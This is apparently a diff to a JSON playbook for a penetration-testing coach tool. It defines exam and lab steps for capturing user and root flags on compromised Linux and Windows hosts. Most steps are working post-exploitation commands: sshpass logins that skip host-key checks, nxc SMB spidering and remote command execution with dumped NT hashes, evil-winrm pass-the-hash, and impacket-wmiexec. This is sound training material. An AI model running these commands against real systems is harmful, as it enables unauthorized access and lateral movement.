@@ -1,99 +1,195 @@
 {
   "name": "obol_flag_hunt_2026_09",
-  "description": "Thorough post-foothold flag capture. Reads well-known flag files through the existing SSH/WinRM proof channel, prints each flag next to a host-identity command (for the exam screenshot), and records what it actually reads.",
+  "description": "Thorough post-foothold flag capture, split the way the exam scores it: the LOCAL/user flag from any shell, and the ROOT/proof flag once you have administrative access. Each flag is captured next to a host-identity command (for the screenshot) and recorded as its own objective, so grabbing the user flag never hides the still-open root flag.",
   "source": {
     "name": "O.B.O.L flag capture methodology",
     "license": "project",
-    "notes": "Runs a single non-interactive recursive search per OS over an existing proven foothold; a captured flag is proof, not a checkbox. Each flag is printed with its own identity block so one screenshot per flag satisfies OffSec's flag+ipconfig requirement."
+    "notes": "A captured flag is proof, not a checkbox. Local and root are separate objectives (objective.local_flag / objective.root_flag) so the coach keeps prompting for the one you have not captured yet."
   },
   "actions": [
     {
       "id": "flag-hunt-linux",
-      "title": "Hunt for flags (Linux)",
-      "tool": "sshpass",
+      "title": "Capture the User Flag (Linux)",
+      "tool": "sh",
       "priority": 97,
-      "requires_all": [
-        "credential.available",
-        "foothold.linux"
+      "requires_all": [],
+      "requires_any": [
+        "foothold.linux",
+        "access.shell",
+        "access.admin",
+        "access.system"
       ],
       "os": [
         "linux"
       ],
       "produces": [
-        "objective.flag"
+        "objective.local_flag"
       ],
-      "hypothesis": "A Linux foothold should be able to read the engagement flag files; capturing their contents proves the objective.",
+      "sequence": true,
+      "hypothesis": "ANY Linux shell can read the user flag - a reverse shell or webshell reads user.txt/local.txt as readily as an SSH login, no credential required. Grab it first and mark the local objective done; the root flag is its own step once you escalate.",
       "report": {
-        "finding": "Captured a flag file from the Linux foothold.",
+        "finding": "Captured the local/user flag from the Linux foothold.",
         "severity": "high"
       },
       "commands": [
         {
+          "tool": "sh",
+          "note": "IN YOUR SHELL (no credential needed): find every flag file and print the user flag with your identity for the screenshot. The common case — you do not need SSH creds to read a flag you can already reach.",
+          "run": "id; hostname; ip -4 addr | grep inet; find / -xdev -type f -size -4k \\( {{flag_inames_linux}} \\) 2>/dev/null -exec echo '--- {} ---' \\; -exec cat {} \\;"
+        },
+        {
           "tool": "sshpass",
-          "note": "STEP 1 — LOCATE (from your box). Find every flag file so you know its path before you log in. This is a one-liner from Kali, so it only LOCATES — OffSec scores a flag read this way ZERO. Paste the output back and obol records each flag's path; capture it on the host in steps 3-4.",
+          "note": "LOCATE OVER SSH (only if you hold SSH creds and have no shell yet). A one-liner from Kali, so it only LOCATES; OffSec scores a flag read this way ZERO. Paste the output back and obol records the path; capture it on the host next.",
           "run": "sshpass -p {{password}} ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 {{user}}@{{target}} 'find / -xdev -type f -size -4k \\( {{flag_inames_linux}} \\) 2>/dev/null'"
         },
         {
-          "tool": "ssh",
-          "note": "STEP 2 — GET ON THE HOST (interactive). Open a real shell on the target; the report proof must be a screenshot of THIS session. Run steps 3-4 inside it.",
-          "run": "ssh {{user}}@{{target}}"
-        },
-        {
           "tool": "cat",
-          "note": "STEP 3 — ON THE HOST, capture the LOCAL/user flag with its identity. Run this INSIDE the step-2 shell and screenshot the whole frame: id + ip addr (the target IP) + the flag, together. The path fills from what step 1 located; adjust it if you skipped the locate. obol records this as the captured local flag.",
+          "note": "ON THE HOST, capture the LOCAL/user flag with its identity. Run this INSIDE your shell and screenshot the whole frame: id + ip addr (the target IP) + the flag, together. obol records this as the captured local flag.",
           "run": "id; hostname; ip -4 addr | grep inet; cat {{flag_path_local}}"
+        }
+      ]
+    },
+    {
+      "id": "flag-hunt-root-linux",
+      "title": "Capture the Root Flag (Linux)",
+      "tool": "cat",
+      "priority": 98,
+      "requires_all": [],
+      "requires_any": [
+        "access.admin",
+        "access.system"
+      ],
+      "os": [
+        "linux"
+      ],
+      "produces": [
+        "objective.root_flag"
+      ],
+      "sequence": true,
+      "hypothesis": "You have root - capture the proof flag before anything else so you can mark the box's final objective done. It lives in /root, which only root can read; grab it with your identity for the screenshot, then move on (persistence, pivot, loot) knowing the box is owned.",
+      "report": {
+        "finding": "Captured the root/proof flag from the Linux host.",
+        "severity": "critical"
+      },
+      "commands": [
+        {
+          "tool": "cat",
+          "note": "ON THE HOST as root, capture the ROOT flag with its identity. Run this INSIDE your root shell and screenshot the whole frame together (id must show uid=0). obol records this as the captured root flag — the box's final objective.",
+          "run": "id; hostname; ip -4 addr | grep inet; cat {{flag_path_root}}"
         },
         {
           "tool": "cat",
-          "note": "STEP 4 — ON THE HOST, capture the ROOT flag with its identity (after you escalate to root). Run this INSIDE a root shell and screenshot the whole frame together. obol records this as the captured root flag.",
-          "run": "id; hostname; ip -4 addr | grep inet; cat {{flag_path_root}}"
+          "note": "If the exact path was not located yet, sweep for it as root (now that /root is readable).",
+          "run": "find / -xdev -type f -size -4k \\( {{flag_inames_linux}} \\) 2>/dev/null -exec echo '--- {} ---' \\; -exec cat {} \\;"
         }
       ]
     },
     {
       "id": "flag-hunt-windows",
-      "title": "Hunt for flags (Windows)",
-      "tool": "nxc",
+      "title": "Capture the User Flag (Windows)",
+      "tool": "cmd",
       "priority": 97,
-      "requires_all": [
-        "credential.available"
-      ],
+      "requires_all": [],
       "requires_any": [
+        "foothold.windows",
         "winrm.authenticated",
+        "access.shell",
         "access.admin",
-        "foothold.windows"
+        "access.system"
       ],
       "os": [
         "windows"
       ],
       "produces": [
-        "objective.flag"
+        "objective.local_flag"
       ],
-      "hypothesis": "A Windows foothold should be able to read the engagement flag files; capturing their contents proves the objective, and printing each next to ipconfig gives the exam screenshot.",
+      "sequence": true,
+      "hypothesis": "ANY Windows shell reads the user flag - a webshell, a WinRM session, or a service-exploit shell all read the user's Desktop\\local.txt, no credential required. Grab it first and mark the local objective done; the root/proof flag is its own step once you are SYSTEM/Administrator.",
       "report": {
-        "finding": "Captured a flag file from the Windows foothold.",
+        "finding": "Captured the local/user flag from the Windows foothold.",
         "severity": "high"
       },
       "commands": [
         {
-          "tool": "nxc",
-          "note": "STEP 1 — LOCATE (from your box). Spider C$ for the flag files so you know each one's exact path (which user's Desktop) before you log in. This runs from Kali, so it only LOCATES the flags — OffSec scores a flag read this way ZERO. Paste the output back and obol records each flag's path and fills it into steps 3-4; you capture it on the host there.",
-          "run": "nxc smb {{target}} -u {{user}} -H {{nthash}} --spider C$ --regex \"(local|proof|user|root|flag)\\.txt\""
-        },
-        {
-          "tool": "evil-winrm",
-          "note": "STEP 2 — GET ON THE HOST (interactive). Log in with the dumped hash — no plaintext needed. The report proof must be a screenshot of THIS session (a shell on the target), so run steps 3-4 inside it. For a SYSTEM shell instead, use impacket-psexec {{domain}}/{{user}}@{{target}} -hashes :{{nthash}}.",
-          "run": "evil-winrm -i {{target}} -u {{user}} -H {{nthash}}"
-        },
-        {
-          "tool": "evil-winrm",
-          "note": "STEP 3 — ON THE HOST, capture the LOCAL flag with its identity. Run this INSIDE the step-2 session and screenshot the whole frame: hostname + ipconfig (the target IP) + the flag, together. The path fills from what step 1 located (the right user's Desktop, the platform's own flag name); adjust it if you skipped the locate. obol records this as the captured local flag.",
+          "tool": "cmd",
+          "locus": "onhost",
+          "win": true,
+          "note": "ON THE HOST, read the LOCATED user flag with your identity in the same frame (hostname + ipconfig + the flag) for the report screenshot. This unlocks once you have searched (the step below): obol fills the exact path from your locate, so it never hands you a Desktop that is not there. obol records this as the captured local flag.",
           "run": "hostname; ipconfig; type {{flag_path_local}}"
         },
         {
+          "tool": "powershell",
+          "locus": "onhost",
+          "note": "LOCATE FIRST, in your WinRM/PowerShell session. The user flag sits on SOME user's Desktop, not yours once you are admin, so search for it before reading. Paste the path it prints and obol fills the read above. Plain cmd.exe shell instead? dir /s /b C:\\Users\\{{flag_names_windows}}",
+          "run": "Get-ChildItem C:\\Users -Recurse -Force -Include {{flag_names_windows}} -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName"
+        },
+        {
+          "tool": "nxc",
+          "locus": "remote",
+          "note": "LOCATE OVER SMB (from Kali, if you hold a hash or credential and have no shell yet). Spider C$ for the flag files and records where they are. A remote read scores ZERO on OffSec, so get on the host to capture; for a lab grab the next line prints it outright.",
+          "run": "nxc smb {{target}} -u {{user}} -H {{nthash}} --spider C$ --regex \"(local|proof|user|root|flag)\\.txt\""
+        },
+        {
+          "tool": "nxc",
+          "locus": "remote",
+          "note": "LAB QUICK GRAB (not OffSec-legal): with the dumped Administrator hash, search every user's Desktop and print the flag remotely in one shot, no shell. obol fills the hash from the NTDS dump, no credential swap, and the names from your profile. Avoids the evil-winrm sealing bug entirely.",
+          "run": "nxc smb {{target}} -u {{dauser}} -H {{dahash}} -x 'for /r C:\\Users %i in ({{flag_names_windows}}) do @type \"%i\"'"
+        },
+        {
           "tool": "evil-winrm",
-          "note": "STEP 4 — ON THE HOST, capture the ROOT/proof flag with its identity. Run this INSIDE the step-2 session (or a SYSTEM/Administrator shell) and screenshot the whole frame together. The path fills from what step 1 located. obol records this as the captured root flag.",
-          "run": "hostname; ipconfig; type {{flag_path_root}}"
+          "locus": "onhost",
+          "note": "GET ON THE HOST interactively (if you hold a hash or credential and have no shell yet) so your flag read counts for the report. If evil-winrm throws CLIENT_TO_SERVER_SEALING the instant it connects on a fresh Kali, that is the rubyntlm 0.6.7 bug (auth already succeeded), not your hash: run `sudo gem install rubyntlm` for 0.6.8 and re-run. The Loadout arsenal applies this fix automatically.",
+          "run": "evil-winrm -i {{target}} -u {{user}} -H {{nthash}}"
+        }
+      ]
+    },
+    {
+      "id": "flag-hunt-root-windows",
+      "title": "Capture the Root/Proof Flag (Windows)",
+      "tool": "cmd",
+      "priority": 98,
+      "requires_all": [],
+      "requires_any": [
+        "access.admin",
+        "access.system"
+      ],
+      "os": [
+        "windows"
+      ],
+      "produces": [
+        "objective.root_flag"
+      ],
+      "sequence": true,
+      "hypothesis": "You are SYSTEM/Administrator - capture the proof flag (Administrator's Desktop\\proof.txt / root.txt) before anything else so the box's final objective is done. Grab it with hostname + ipconfig for the screenshot, then move on to persistence/pivot knowing the box is owned.",
+      "report": {
+        "finding": "Captured the root/proof flag from the Windows host.",
+        "severity": "critical"
+      },
+      "commands": [
+        {
+          "tool": "nxc",
+          "locus": "remote",
+          "run": "nxc smb {{target}} -u {{dauser}} -H {{dahash}} -x 'type {{flag_path_root}}'",
+          "note": "PREFERRED, no shell needed. With the Administrator NT hash you just dumped from NTDS, read the root flag remotely over SMB. obol fills the hash from the dump (no credential swap) and the path from Administrator's Desktop, or from your locate if you searched. If evil-winrm died with CLIENT_TO_SERVER_SEALING (the rubyntlm 0.6.7 bug on a fresh Kali), use this: nxc reads the flag without evil-winrm."
+        },
+        {
+          "tool": "cmd",
+          "locus": "onhost",
+          "win": true,
+          "note": "ON THE HOST as SYSTEM/Administrator, capture the ROOT/proof flag with its identity in the same frame (whoami + hostname + ipconfig + the flag) for the report. obol records this as the captured root flag, the box's final objective.",
+          "run": "whoami; hostname; ipconfig; type {{flag_path_root}}"
+        },
+        {
+          "tool": "impacket-wmiexec",
+          "locus": "remote",
+          "run": "impacket-wmiexec -hashes ':{{dahash}}' {{dauser}}@{{target}} 'type {{flag_path_root}}'",
+          "note": "Fallback remote read with the DA hash via impacket wmiexec (semi-interactive is also fine: impacket-wmiexec -hashes :{{dahash}} {{dauser}}@{{target}})."
+        },
+        {
+          "tool": "powershell",
+          "locus": "onhost",
+          "note": "LOCATE if the proof flag is NOT on Administrator's Desktop (rare). Searches every Desktop for your profile's flag names; paste the path it prints and obol fills the reads above. Plain cmd.exe shell instead? dir /s /b C:\\Users\\{{flag_names_windows}}",
+          "run": "Get-ChildItem C:\\Users -Recurse -Force -Include {{flag_names_windows}} -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName"
         }
       ]
     }
